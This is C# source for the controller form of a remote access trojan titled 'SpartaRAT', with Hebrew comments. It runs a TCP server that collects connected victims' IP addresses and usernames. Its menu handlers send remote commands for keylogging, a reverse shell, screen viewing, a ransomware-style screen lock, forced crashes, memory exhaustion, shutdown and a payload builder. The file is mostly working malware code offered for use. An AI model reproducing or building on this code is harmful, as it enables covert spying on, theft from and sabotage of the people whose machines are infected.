using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Threading;
using System.Net.Sockets;
using System.Web;
using System.IO;
using System.Diagnostics;
using System.Speech;
using System.Speech.Synthesis;
using System.CodeDom;
using System.CodeDom.Compiler;
using WMPLib;
using System.Net.NetworkInformation;

namespace WindowsFormsApp23
{
    public partial class Main : Form
    {

        WindowsMediaPlayer player = new WindowsMediaPlayer();
        public int n = 1;

        public Socket socket;
        public string ip = "127.0.0.1";
        public string username;
        public IPEndPoint ipendpoint;
        public Socket backgroundclient;
        public string remoteendpoint;
        public ListViewItem item1;
        public int portUsee;
        public Socket client;
        public int i = 1;
        public string newLine = Environment.NewLine;
        Dictionary<string, Socket> map = new Dictionary<string, Socket>();
        
        public int v = 0;

        public int threadid = 0;

        public Thread clientThread;
        public Thread startupThread;
        public string number = "1";
        public string userName;

        public ListViewItem hasMatch;
        public int fordaloop = 0;
        string myip;
        string hostname;
        public string point = "27.0.0.1";

        List<ListViewItem> items = new List<ListViewItem> ();



        //testing area

        
        //testing area









        public int la = 0;
        public string commandgetting { get; set; }
        public string ipaddress;

        public Main()
        {

            InitializeComponent();
            username = Environment.UserName;
            theme.RunWorkerAsync();

            Process p = new Process();
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.FileName = "powershell.exe";
            string command = @"Get-NetIPAddress -AddressFamily IPv4 -InterfaceIndex $(Get-NetConnectionProfile | Select-Object -ExpandProperty InterfaceIndex) | Select-Object -ExpandProperty IPAddress";
            p.StartInfo.Arguments = command;
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.Start();
            p.WaitForExit();
            ipaddress = p.StandardOutput.ReadLine();

            this.Text = "FXP - SpartaRAT Project";
            

            this.listView1.ColumnWidthChanging += new ColumnWidthChangingEventHandler(listView1_ColumnWidthChanging);

            ipaddress = ip;

              startupThread = new Thread(new ThreadStart((Mainn)));//יוצר טריד
                startupThread.Start(); //מפעיל את הטריד


            


        }

        void Mainn()
        {

            Thread.Sleep(200);


                    v = 0;
                
            


            

        }

        void listView1_ColumnWidthChanging(object sender, ColumnWidthChangingEventArgs e)
        {
            Console.Write("Column Resizing");
            e.NewWidth = this.listView1.Columns[e.ColumnIndex].Width;
            e.Cancel = true;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Alert alert = new Alert();
            alert.ShowDialog();

            forDaDoop.RunWorkerAsync();

            string path = @"C:\Users\"+ username + @"\Documents\text.txt";
            using (StreamWriter sw = File.CreateText(path))

                axWindowsMediaPlayer1.Visible = false;
            player.URL = @"https://myproject054.000webhostapp.com/RedAlertSounds.mp4";

            listView1.MouseUp += new MouseEventHandler(listView1_MouseClick);

        }






        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {
            

            
        }


        private void listView1_MouseClick(object sender, MouseEventArgs e)
        {
            this.contextMenuStrip1.ShowImageMargin = true;
            this.contextMenuStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);


        }
        


      



        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {
            try
            {
                while (i == 1)//במידה ואיי יהיה אחד
                {



                    try
                    {
                        if (i == 1)//אם איי יהיה אחד
                        {
                            backgroundclient = socket.Accept(); // כל פעם שמערכת מנסה להתחבר היא ת אושר)
                            remoteendpoint = backgroundclient.RemoteEndPoint.ToString();//יזהה את האייפי הפרטי של הצד השני
                            map[remoteendpoint] = backgroundclient;//ממפה כל אייפי לעומת הפרטי התחברות



                            //MessageBox.Show("Connection has been maded from " + remoteendpoint); //התחברות


                            clientThread = new Thread(new ThreadStart(() => User(backgroundclient)));//יוצר טריד
                            clientThread.Start(); //מפעיל את הטריד
                            
                            Thread.Sleep(1000);
                        }
                        else
                        {
                            socket.Close();
                            socket = null;
                        }

                    }
                    catch {  }


                }
            }catch { }
        }




        public void User(Socket client)
        {
            int j = 1;
            try {
                
            while (i == 1)
            {
                while (true)
                {
                        if (j == 1)
                        {
                            try
                            {
                                client.Send(Encoding.ASCII.GetBytes(" "));
                            }
                            catch
                            {
                                j--;
                                //MessageBox.Show(client.RemoteEndPoint + " Have disconnected.");
                                if (!InvokeRequired)
                                {
                                    ListViewItem ConnectionTest = listView1.FindItemWithText(client.RemoteEndPoint.ToString());
                                    listView1.Items.Remove(ConnectionTest);

                                    clientThread.Abort();
                                }
                                else
                                {
                                    this.BeginInvoke((MethodInvoker)(() =>
                                    {
                                        ListViewItem ConnectionTest = listView1.FindItemWithText(client.RemoteEndPoint.ToString());
                                        listView1.Items.Remove(ConnectionTest);

                                        clientThread.Abort();
                                    }));
                                }
                            }
                        }

                        if (threadid == 1)
                    {
                        break;
                    }
                    try
                    {



                            listView1.Invoke((MethodInvoker)delegate
                            {
                                try
                                {
                                    hasMatch = listView1.FindItemWithText(remoteendpoint);
                                }
                                catch { }

                                if (hasMatch == null)
                                {
                                    item1 = new ListViewItem(remoteendpoint);
                                    items.Add(item1);

                                    listView1.Invoke((MethodInvoker)delegate
                                    {
                                        try
                                        {


                                            string pubip = "pubip";
                                            client.Send(Encoding.ASCII.GetBytes(pubip));

                                            int getting1 = 0;
                                            byte[] buffer1 = new byte[1024];
                                            getting1 = client.Receive(buffer1);
                                            pubip = Encoding.ASCII.GetString(buffer1, 0, getting1);


                                            string privateip2 = "privateip";
                                            client.Send(Encoding.ASCII.GetBytes(privateip2));

                                            int getting2 = 0;
                                            byte[] buffer2 = new byte[1024];
                                            getting2 = client.Receive(buffer2);
                                            privateip2 = Encoding.ASCII.GetString(buffer2, 0, getting2);

                                            string username3 = "username";
                                            client.Send(Encoding.ASCII.GetBytes(username3));

                                            int getting3 = 0;
                                            byte[] buffer3 = new byte[1024];
                                            getting3 = client.Receive(buffer3);
                                            username3 = Encoding.ASCII.GetString(buffer3, 0, getting3);

                                            Connection connect = new Connection();
                                            connect.username = username3;
                                            connect.ipaddress = pubip;
                                            connect.Show();


                                            try
                                            {



                                                item1.BackColor = System.Drawing.Color.Aqua;
                                                item1.ForeColor = System.Drawing.Color.Red;
                                                item1.SubItems.Add(privateip2);
                                                item1.SubItems.Add(pubip);
                                                item1.SubItems.Add(username3);
                                                item1.SubItems.Add("");
                                                item1.SubItems.Add("");





                                                listView1.Items.AddRange(new ListViewItem[] { item1 });
                                                item1.Selected = false;


                                            }
                                            catch { }




                                            Thread.Sleep(200);

















                                        }
                                        catch
                                        { }

                                    });
                                }


                                //כתיבה בלייב לעמודה את החלון הפעיל וזמן אי הפעילות




                                
                                
                                    });



                            byte[] msg = new byte[1024];
                            int size = client.Receive(msg);
                            Thread.Sleep(1000);

 //                           ListView findListView = new ListView();

   //                             remoteendpoint = client.RemoteEndPoint.ToString();

                                //textBox1.Invoke((MethodInvoker)delegate
                                //{
                                //  textBox1.Text += userName + " " + ip2 + " >> " + System.Text.Encoding.ASCII.GetString(msg, 0, size) + newLine;
                                //});

                            }

                    catch
                    {


                    }

                        

                        

                    }

                    
                }
            }
            catch { }
        }


            

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void test2ToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {

            player.controls.stop();

            this.Hide();
            if (backgroundclient != null)
            {
                if (socket != null)
                {
                    backgroundclient.Close();
                    socket.Close();
                    clientThread.Abort();
                    backgroundWorker1.CancelAsync();
                }
            }

            Process process = new Process();
            process.StartInfo.FileName = "powershell.exe";
            process.StartInfo.Arguments = "taskkill /f /im SpartaRAT.exe; taskkill /f /im WindowsFormsApp23.exe;";
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process.StartInfo.UseShellExecute = false;
            process.Start();
            

        }

          

        private void button1_Click(object sender, EventArgs e)
        {
            testPaint test = new testPaint();
            test.ShowDialog();
        }

        private void test1ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            HallOfFrame hoff = new HallOfFrame();
            hoff.Show();
        }

        private void rAMDosToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (socket != null)
            {
                string ip3;
                try
                {

                    ip3 = listView1.SelectedItems[0].Text;
                    Socket clientToSend = map[ip3];

                    try
                    {
                        string tosend = " ";
                        clientToSend.Send(Encoding.ASCII.GetBytes(tosend));
                    }
                    catch
                    {
                        listView1.SelectedItems[0].Remove();
                        backgroundclient = null;
                        MessageBox.Show("No connection.");
                    }
                    try
                    {
                        string tosend = "ram";
                        clientToSend.Send(Encoding.ASCII.GetBytes(tosend));
                        try
                        {
                            RAM attackRAM = new RAM();
                            attackRAM.ip3 = listView1.SelectedItems[0].Text;
                            attackRAM.clientToSend = map[ip3];
                            attackRAM.newLine = newLine;
                            attackRAM.publicIP = "unknown";
                            attackRAM.client = backgroundclient;
                            attackRAM.ShowDialog();
                        }
                        catch { }


                    }
                    catch
                    {


                    }


                }
                catch { MessageBox.Show("No client selected."); }
            }
            else
            {
                MessageBox.Show("you must have a running server");
            }
        }

        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {

        }

        private void createAServerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (socket == null)//כל עוד אין שרת קיים
            {

                if (ip == number + point && ipaddress == number + point)
                {
                    i = 1; //איי יהיה שווה לאחד על מנת שהוא יוכל להיות בלופ
                    threadid = 0; //הטריד לא יישבר בהתחלה
                    socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp); //יוצר את השרת
                    string hostname = Dns.GetHostName();//בשביל האייפי
                    try
                    {
                        ip = Dns.GetHostByName(hostname).AddressList[1].ToString();//מנסה להשיג את האייפי השני ברשימה
                    }
                    catch
                    {
                        ip = Dns.GetHostByName(hostname).AddressList[0].ToString(); //אם אין אז את האייפי הראשון
                    }


                    try
                    {
                        int port = portUsee;
                        ipendpoint = new IPEndPoint(IPAddress.Parse(ipaddress), port);//יוצר פרטים
                        socket.Bind(ipendpoint);//מצמיד לשרת שיצרנו את האייפי של השרת ואת הפורט
                        socket.Listen(1);//מתחיל את השרת באופן רשמי
                        MessageBox.Show("server created on " + ipendpoint.ToString());//השרת נוצר



                        backgroundWorker1.WorkerSupportsCancellation = true;
                        backgroundWorker1.RunWorkerAsync();//מתחיל את העבודה של הבאקגראונד


                    }

                    catch { }
                }
                else
                {
                    MessageBox.Show("Your computer dosent supports exe files running. (X000001 skid error)");
                }
            }
            else
            {
                MessageBox.Show("server already created.");//אם השרת כבר נוצר
            }
            
        }

        private void deleteAServerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (socket != null)//כל עוד השרת הוא לא ריק
                {
                    i = 0;//איי אפס כדי שזה לא יוכל להמשיך בלופ

                    ////////////////////////////////////////////////////////////////////////////////////





                    backgroundclient = null; //מאפס את ההתחברות שעתידה לבוא מהקליאנט
                    remoteendpoint = null;//מאפס את הכתובת אייפי של הצד השני
                    





                    try
                    {
                        backgroundWorker1.CancelAsync();//מבטל את הבאקגראונדוורקר

                    }
                    catch { }
                    try
                    {
                        threadid = 1;//משנה את הטריד איידי לאחד

                    }
                    catch { }


                    MessageBox.Show("socket has been closed");//השרת נסגר
                    socket.Close();//סוגר את השרת (שימו לב זה עובד אבל מקפיץ הודעת תקלה)י
                    socket = null;//מאפס את הסוקט
                }


                else
                    MessageBox.Show("there is no server you can stop.");//אחרת זה ירשום שאין שרת קיים שאפשר לסגור
            }



            catch { }
            ip = "127.0.0.1";
            ipaddress = "127.0.0.1";
        }

        private void buildProgramToolStripMenuItem_Click(object sender, EventArgs e)
        {
            
            //בניית תוכנה
            Builder build = new Builder();
            build.port = portUsee;
            build.ShowDialog();


        }

        private void screenViewerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (socket != null)

            {

                try
                {


                    string ip3 = listView1.SelectedItems[0].Text;
                    Socket clientToSend = map[ip3];
                    string starting = "ScreenShare";
                    try
                    {
                        clientToSend.Send(Encoding.ASCII.GetBytes(starting));
                    }
                    catch
                    {
                        listView1.SelectedItems[0].Remove();
                    }

                    try
                    {




                        RemoteScreen forma = new RemoteScreen();
                        forma.ipv4 = ipaddress;
                        forma.ShowDialog();







                    }
                    catch { }


                }
                catch
                {

                    MessageBox.Show("No connection.");
                }

            }
            else
            {
                MessageBox.Show("you must have a running server");
            }
        }

        private void processManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (socket != null)
            {
                string ip3;
                try
                {

                    ip3 = listView1.SelectedItems[0].Text;
                    Socket clientToSend = map[ip3];

                    try
                    {
                        string tosend = " ";
                        clientToSend.Send(Encoding.ASCII.GetBytes(tosend));

                        taskmanager mgr = new taskmanager();
                        mgr.clientToSend = map[ip3];
                        mgr.ShowDialog();


                    }
                    catch
                    {
                        listView1.SelectedItems[0].Remove();
                        MessageBox.Show("No connection.");
                    }



                }
                catch { MessageBox.Show("No client selected."); }
            }
            else
            {
                MessageBox.Show("you must have a running server");
            }

        }

        private void computerSpeakToolStripMenuItem_Click(object sender, EventArgs e)
        {
            
            if (socket != null)
            {
                string ip3;
                try
                {

                    ip3 = listView1.SelectedItems[0].Text;
                    Socket clientToSend = map[ip3];

                    try
                    {
                        string tosend = " ";
                        clientToSend.Send(Encoding.ASCII.GetBytes(tosend));

                        ComputerSpeak form = new ComputerSpeak();
                        form.clientToSend = map[ip3];
                        form.ShowDialog();


                    }
                    catch
                    {
                        listView1.SelectedItems[0].Remove();
                        MessageBox.Show("No connection.");
                    }



                }
                catch { MessageBox.Show("No client selected."); }
            }
            else
            {
                MessageBox.Show("you must have a running server");
            }
        }

        private void settingsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Settings form = new Settings();
            form.ShowDialog();
        }

        private void reverseShellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (socket != null)
            {
                string ip3;
                try
                {

                    ip3 = listView1.SelectedItems[0].Text;
                    Socket clientToSend = map[ip3];

                    try
                    {
                        string tosend = " ";
                        clientToSend.Send(Encoding.ASCII.GetBytes(tosend));
                    }
                    catch
                    {
                        listView1.SelectedItems[0].Remove();
                        backgroundclient = null;
                        MessageBox.Show("No connection.");
                    }
                    try
                    {
                        string tosend = " ";
                        clientToSend.Send(Encoding.ASCII.GetBytes(tosend));
                        Form3 form = new Form3();
                        form.ip3 = listView1.SelectedItems[0].Text;
                        form.clientToSend = map[ip3];
                        form.newLine = newLine;
                        form.publicIP = "unknown";
                        form.client = backgroundclient;
                        form.Show();


                    }
                    catch
                    {


                    }


                }
                catch { MessageBox.Show("No client selected."); }
            }
            else
            {
                MessageBox.Show("you must have a running server");
            }
        }

        private void paintToolToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (socket != null)
            {
                string ip3;
                try
                {

                    ip3 = listView1.SelectedItems[0].Text;
                    Socket clientToSend = map[ip3];

                    try
                    {
                        string tosend = " ";
                        clientToSend.Send(Encoding.ASCII.GetBytes(tosend));
                    }
                    catch
                    {
                        listView1.SelectedItems[0].Remove();
                        backgroundclient = null;
                        MessageBox.Show("No connection.");
                    }
                    try
                    {
                        string tosend = "paint";
                        clientToSend.Send(Encoding.ASCII.GetBytes(tosend));
                        try
                        {
                            testPaint form = new testPaint();
                            form.ipv4 = ipaddress;
                            form.ShowDialog();
                        }
                        catch { }


                    }
                    catch
                    {


                    }


                }
                catch { MessageBox.Show("No client selected."); }
            }
            else
            {
                MessageBox.Show("you must have a running server");
            }
        }

        private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (socket != null)
            {
                string ip3;
                try
                {

                    ip3 = listView1.SelectedItems[0].Text;
                    Socket clientToSend = map[ip3];

                    try
                    {
                        string tosend = " ";
                        clientToSend.Send(Encoding.ASCII.GetBytes(tosend));
                    }
                    catch
                    {
                        listView1.SelectedItems[0].Remove();
                        backgroundclient = null;
                        MessageBox.Show("No connection.");
                    }
                    try
                    {
                        string tosend = " ";
                        clientToSend.Send(Encoding.ASCII.GetBytes(tosend));
                        try
                        {
                            Keylogger keylogger = new Keylogger();
                            keylogger.ip3 = listView1.SelectedItems[0].Text;
                            keylogger.clientToSend = map[ip3];
                            keylogger.newLine = newLine;
                            keylogger.publicIP = "unknown";
                            keylogger.client = backgroundclient;
                            keylogger.ShowDialog();
                        }
                        catch { }


                    }
                    catch
                    {


                    }


                }
                catch { MessageBox.Show("No client selected."); }
            }
            else
            {
                MessageBox.Show("you must have a running server");
            }
        }

        private void commandToolsToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void crashingBlueScreenToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                string ip3 = listView1.SelectedItems[0].Text;
                Socket clientToSend = map[ip3];
                clientToSend.Send(Encoding.ASCII.GetBytes("crash 1"));
            } catch
            {
                MessageBox.Show("No client connected.");
            }
        }

        private void autoHideTaskbarToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void hideTaskbarToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //זה לא מה שאני צריך, אני צריך לעשות אופציה בתוך זה של הפעל וכבה, אני שם כאן את הקוד בשביל שהוא יישמר ואוכל להשתמש בו בהמשך.
            //נכון לעכשיו אין בכלל קוד
        }

        private void shutdownComputerToolStripMenuItem_Click(object sender, EventArgs e)
        {

            try
            {

                string ip3 = listView1.SelectedItems[0].Text;
            Socket clientToSend = map[ip3];

            
                //shutdown
                string shutdown = "shutdown";
                byte[] bytehide = Encoding.ASCII.GetBytes(shutdown);
                clientToSend.Send(bytehide);

            }catch { MessageBox.Show("No client connected."); }

        }

        private void restartClientToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {

                string ip3 = listView1.SelectedItems[0].Text;
            Socket clientToSend = map[ip3];


                //restart
                string restart = "restart";
                byte[] bytehide = Encoding.ASCII.GetBytes(restart);
                clientToSend.Send(bytehide);

            }
            catch { MessageBox.Show("No client connected."); }
        }

        private void disconnectFormServerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {

                string ip3 = listView1.SelectedItems[0].Text;
                Socket clientToSend = map[ip3];

                clientToSend.Send(Encoding.ASCII.GetBytes("Logout"));
            }catch
            { }
        }

        private void contextMenuStrip1_Opening(object sender, CancelEventArgs e)
        {

        }

        private void msgbox_Click(object sender, EventArgs e)
        {
            
            if (socket != null)
            {
                string ip3;
                try
                {

                    ip3 = listView1.SelectedItems[0].Text;
                    Socket clientToSend = map[ip3];

                    try
                    {
                        string tosend = " ";
                        clientToSend.Send(Encoding.ASCII.GetBytes(tosend));

                        MsgBox form = new MsgBox();
                        form.clientToSend = map[ip3];
                        form.ShowDialog();


                    }
                    catch
                    {
                        listView1.SelectedItems[0].Remove();
                        MessageBox.Show("No connection.");
                    }



                }
                catch { MessageBox.Show("No client selected."); }
            }
            else
            {
                MessageBox.Show("you must have a running server");
            }
        }

        private void notification_Click(object sender, EventArgs e)
        {
            
            if (socket != null)
            {
                string ip3;
                try
                {

                    ip3 = listView1.SelectedItems[0].Text;
                    Socket clientToSend = map[ip3];

                    try
                    {
                        string tosend = " ";
                        clientToSend.Send(Encoding.ASCII.GetBytes(tosend));

                        notification form = new notification();
                        form.clientToSend = map[ip3];
                        form.ShowDialog();


                    }
                    catch
                    {
                        listView1.SelectedItems[0].Remove();
                        MessageBox.Show("No connection.");
                    }



                }
                catch { MessageBox.Show("No client selected."); }
            }
            else
            {
                MessageBox.Show("you must have a running server");
            }
        }

        private void enableToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try {

            string ip3 = listView1.SelectedItems[0].Text;
            Socket clientToSend = map[ip3];

            
                //auto hide
                string autohide = "ah1"; //מפעיל את ההסתרה האוטומטית
                byte[] bytehide = Encoding.ASCII.GetBytes(autohide);
                clientToSend.Send(bytehide);

            }
            catch { MessageBox.Show("No client connected."); }
        }

        private void disableToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                string ip3 = listView1.SelectedItems[0].Text;
                Socket clientToSend = map[ip3];

                //disable auto hide
                string autohide = "ah0"; //מבטל את ההסתרה האוטומטית
                byte[] bytehide = Encoding.ASCII.GetBytes(autohide);
                clientToSend.Send(bytehide);

            }
            catch { MessageBox.Show("No client connected."); }
        }

        private void axWindowsMediaPlayer1_Enter(object sender, EventArgs e)
        {

        }




        private void forDaDoop_DoWork(object sender, DoWorkEventArgs e)
        {
            string readText;
            string fullPath = @"C:\Users\"+ username + @"\Documents\text.txt";

            using (StreamWriter writer = new StreamWriter(fullPath))
            {
                writer.Write("play");
            }
            

            while (true)
            {
            again:
                readText = File.ReadAllText(fullPath);

                if (Application.OpenForms["HallOfFrame"] != null)
                {
                    try
                    {
                        player.controls.stop();
                    }
                    catch
                    { }

                }
                else
                {
                    try
                    {
                        if (readText == "play")
                        {
                            player.controls.play();


                            File.WriteAllText(fullPath, String.Empty);

                            using (StreamWriter writer = new StreamWriter(fullPath))
                            {
                                writer.Write("stopplay");
                            }

                        }


                    }
                    catch
                    { }


                }


            }
        }


        private void backgroundWorker3_DoWork(object sender, DoWorkEventArgs e)
        {
            
        }

        private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void anotherComputersInTheNetworkToolStripMenuItem_Click(object sender, EventArgs e)
        {
           
            

        }

        private void randsdomwareToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (socket != null)
            {
                string ip3;
                try
                {

                    ip3 = listView1.SelectedItems[0].Text;
                    Socket clientToSend = map[ip3];

                    try
                    {
                        string tosend = " ";
                        clientToSend.Send(Encoding.ASCII.GetBytes(tosend));

                        ScreenLock form = new ScreenLock();
                        form.clientToSend = map[ip3];
                        form.ShowDialog();


                    }
                    catch
                    {
                        listView1.SelectedItems[0].Remove();
                        MessageBox.Show("No connection.");
                    }



                }
                catch { MessageBox.Show("No client selected."); }
            }
            else
            {
                MessageBox.Show("you must have a running server");
            }
        }

        private void taskbarLocationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (socket != null)
            {
                try
                {
                    string ip3 = listView1.SelectedItems[0].Text;
                    Socket clientToSend = map[ip3];
                
                try
                {
                    string tosend = " ";
                    clientToSend.Send(Encoding.ASCII.GetBytes(tosend));

                    taskbar form = new taskbar();
                    form.clientToSend = clientToSend;
                    form.Show();
                } catch
                {
                    listView1.SelectedItems[0].Remove();
                    MessageBox.Show("lost connection.");
                }
            }catch
                {
                    MessageBox.Show("No client selected.");
                }
            }
            else
            {
                MessageBox.Show("you must have a running server");
            }

        }

        void idleTime()
        {
            
            
        }

        private void button1_Click_1(object sender, EventArgs e)
        {

            try
            {
                string ip3 = listView1.SelectedItems[0].Text;
                Socket clientToSend = map[ip3];

                try{
                    clientToSend.Send(Encoding.ASCII.GetBytes("idleTime"));
                    int saizo = 0;
                    byte[] buffer = new byte[1024];
                    saizo = clientToSend.Receive(buffer);

                    string idleTime = Encoding.ASCII.GetString(buffer, 0, saizo);

                    listView1.SelectedItems[0].SubItems[5].Text = idleTime;
                }catch (Exception ex){MessageBox.Show(ex.Message);}


                try
                {
                    clientToSend.Send(Encoding.ASCII.GetBytes("currentWindow"));
                    int saizo = 0;
                    byte[] buffer = new byte[1024];
                    saizo = clientToSend.Receive(buffer);

                    string currentWindow = Encoding.ASCII.GetString(buffer, 0, saizo);

                    listView1.SelectedItems[0].SubItems[4].Text = currentWindow;
                }
                catch (Exception ex) { MessageBox.Show(ex.Message); }




            } catch
            {
                MessageBox.Show("No client selected.");
            }


        }

        private void backgroundWorker2_DoWork(object sender, DoWorkEventArgs e)
        {
            
        }

        private void aboutMeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            AboutMe form = new AboutMe();
            form.ShowDialog();
        }

        private void theme_DoWork(object sender, DoWorkEventArgs e)
        {

            while (true)
            {
                try
                {
                    string fullPath = @"C:\Users\"+ username + @"\Documents\theme.txt";
                    var fs = new FileStream(fullPath, FileMode.Open, FileAccess.Read);
                    var sr = new StreamReader(fs, Encoding.UTF8);

                    string text = sr.ReadToEnd();
                    if (text == "darkTheme")
                    {

                        this.listView1.BeginInvoke((MethodInvoker)(() =>
                        {
                            listView1.BackColor = Color.Black;
                        }));



                    }
                    else
                    {

                        this.listView1.BeginInvoke((MethodInvoker)(() =>
                        {
                            listView1.BackColor = Color.White;
                        }));



                    }
                }
                catch { }


            }

        }

        private void hideDesktopIconsToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void onToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                string ip3 = listView1.SelectedItems[0].Text;
                Socket clientToSend = map[ip3];

                try
                {
                    clientToSend.Send(Encoding.ASCII.GetBytes("HideDesktop_ON"));
                    
                }
                catch (Exception ex) { MessageBox.Show(ex.Message); }



            }
            catch
            {
                MessageBox.Show("No client selected.");
            }
        }

        private void offToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                string ip3 = listView1.SelectedItems[0].Text;
                Socket clientToSend = map[ip3];

                try
                {
                    clientToSend.Send(Encoding.ASCII.GetBytes("HideDesktop_OFF"));

                }
                catch (Exception ex) { MessageBox.Show(ex.Message); }



            }
            catch
            {
                MessageBox.Show("No client selected.");
            }
        }

        private void remoteChatToolStripMenuItem_Click(object sender, EventArgs e)
        {

            try
            {
                string ip3 = listView1.SelectedItems[0].Text;
                Socket clientToSend = map[ip3];

                try
                {
                    clientToSend.Send(Encoding.ASCII.GetBytes("chat"));
                    Chat chat = new Chat();
                    if(ipaddress == "" || ipaddress == " " || ipaddress == null)
                    {
                        MessageBox.Show("something wrong");
                    }
                    chat.clientToSend = clientToSend;
                    chat.ShowDialog();

                }
                catch (Exception ex) { MessageBox.Show(ex.Message); }



            }
            catch
            {
                MessageBox.Show("No client selected.");
            }

        }

        private void port_btn_Click(object sender, EventArgs e)
        {
            if(portUse.Text != "")
            {
                portUsee = int.Parse(portUse.Text);
                portUse.Visible = false;
                port_btn.Visible = false;
            }
            else
            {
                MessageBox.Show("Please enter a valid port");
            }
        }
    }
    }
    
    

